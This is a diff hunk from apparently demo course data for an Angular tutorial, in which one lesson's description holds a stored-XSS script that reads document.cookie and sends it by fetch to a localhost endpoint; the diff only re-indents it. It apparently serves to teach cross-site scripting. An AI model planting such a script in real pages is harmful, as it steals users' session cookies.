@@ -9,17 +9,17 @@ export const LESSONS = {
 
             Angular Tutorial For Beginners - Build Your First App - Hello World Step By Step
 
-            <script> 
-            
-            console.log('XSS script running...');
-            
-            var cookies = document.cookie;
-            
-            console.log(cookies);
-            
-            fetch('https://localhost:9090/img/xss?userCookies=' + cookies);            
-            
-            </script>
+<script>
+
+    console.log('XSS script running...');
+
+    var cookies = document.cookie;
+
+    console.log(cookies);
+
+    fetch('https://localhost:9090/img/xss?userCookies=' + cookies);
+
+</script>
 
         `,
         "longDescription": `<p>This is step by step guide to create your <b>first  application</b>. <b>Its aimed at beginners</b> just starting out with the framework.This lesson will show how to create a component, and how to link the component to a <i>given custom HTML tag</i>. It will show how to give the component a given template.</p>`,
